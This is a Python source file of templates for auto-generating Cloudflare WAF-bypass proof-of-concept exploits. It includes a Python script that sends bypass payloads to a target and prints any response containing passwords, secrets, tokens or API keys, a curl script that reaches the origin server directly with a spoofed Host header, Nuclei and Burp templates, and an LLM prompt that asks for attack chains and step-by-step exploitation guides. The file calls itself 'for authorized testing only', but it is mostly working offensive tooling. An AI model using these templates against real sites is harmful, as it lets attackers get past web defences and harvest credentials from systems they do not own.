"""
POC Templates and LLM Analysis Prompt Templates
"""

# ============================================
# POC TEMPLATES FOR EXPLOIT GENERATION
# ============================================

POC_TEMPLATES = {
    'python': '''#!/usr/bin/env python3
"""
Cloudflare WAF Bypass - Auto-Generated POC
Target: {target}
Generated: {timestamp}
Vulnerability: {vuln_type}

DISCLAIMER: For authorized testing only!
"""

import requests
import urllib3
urllib3.disable_warnings()

TARGET = "{target}"
ORIGIN_IP = "{origin_ip}"  # Direct origin IP (if found)

def exploit():
    session = requests.Session()
    headers = {{
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
        {custom_headers}
    }}
    
    # Exploit payloads
    payloads = {payloads}
    
    print(f"[*] Testing {{TARGET}}")
    
    for payload in payloads:
        url = f"{{TARGET}}{{payload}}"
        try:
            resp = session.get(url, headers=headers, timeout=10, verify=False)
            print(f"[{{resp.status_code}}] {{url[:80]}}")
            
            if resp.status_code == 200:
                print(f"    Content-Length: {{len(resp.content)}}")
                # Check for sensitive data
                if any(x in resp.text.lower() for x in ['password', 'secret', 'token', 'api_key']):
                    print(f"    [!] SENSITIVE DATA DETECTED!")
                    print(resp.text[:500])
        except Exception as e:
            print(f"[ERR] {{str(e)[:50]}}")
    
    # Direct origin access (if IP found)
    if ORIGIN_IP and ORIGIN_IP != "N/A":
        print(f"\\n[*] Testing direct origin: {{ORIGIN_IP}}")
        headers["Host"] = "{hostname}"
        try:
            url = f"https://{{ORIGIN_IP}}/"
            resp = session.get(url, headers=headers, timeout=10, verify=False)
            print(f"[{{resp.status_code}}] Direct origin access - {{len(resp.content)}} bytes")
        except Exception as e:
            print(f"[ERR] {{str(e)[:50]}}")

if __name__ == "__main__":
    exploit()
''',

    'curl': '''#!/bin/bash
# Cloudflare WAF Bypass - Auto-Generated POC
# Target: {target}
# Generated: {timestamp}
# Vulnerability: {vuln_type}
# DISCLAIMER: For authorized testing only!

TARGET="{target}"
ORIGIN_IP="{origin_ip}"

echo "[*] Testing WAF Bypass on $TARGET"

# WAF Bypass payloads
{curl_commands}

# Direct origin access (if IP found)
if [ "$ORIGIN_IP" != "N/A" ]; then
    echo ""
    echo "[*] Testing direct origin: $ORIGIN_IP"
    curl -k -s -o /dev/null -w "%{{http_code}}" -H "Host: {hostname}" "https://$ORIGIN_IP/"
    echo " - Direct origin access"
fi
''',

    'nuclei': '''id: cloudflare-waf-bypass-{target_safe}

info:
  name: Cloudflare WAF Bypass - {target}
  author: auto-generated
  severity: high
  description: |
    Cloudflare WAF bypass detected on {target}
    Vulnerability: {vuln_type}
  tags: cloudflare,waf,bypass
  reference:
    - https://fearsoff.org/research/cloudflare-acme

http:
{nuclei_requests}

# Generated: {timestamp}
''',

    'burp': '''# Burp Suite Request - Cloudflare WAF Bypass
# Target: {target}
# Generated: {timestamp}

{burp_requests}
''',
}


# ============================================
# LLM ANALYSIS PROMPT TEMPLATES  
# ============================================

LLM_ANALYSIS_PROMPT = '''You are an expert security researcher analyzing vulnerability scan results.

## Scan Results
Target: {target}
Cloudflare Protected: {cloudflare}
WAF Bypass Detected: {waf_bypass}
Framework Detected: {framework}
Origin IP(s): {origin_ips}

## Findings:
{findings_json}

## Analysis Tasks:
1. **Risk Assessment**: Rate the overall risk (Critical/High/Medium/Low) and explain why
2. **Attack Chain**: Describe potential attack chains combining these vulnerabilities
3. **Impact Analysis**: What sensitive data or systems could be compromised?
4. **Exploitation Steps**: Step-by-step exploitation guide for penetration testers
5. **Remediation**: Specific recommendations to fix each vulnerability
6. **CVSS Score**: Estimate CVSS 3.1 score with vector string

Provide detailed, actionable analysis for security professionals.
'''
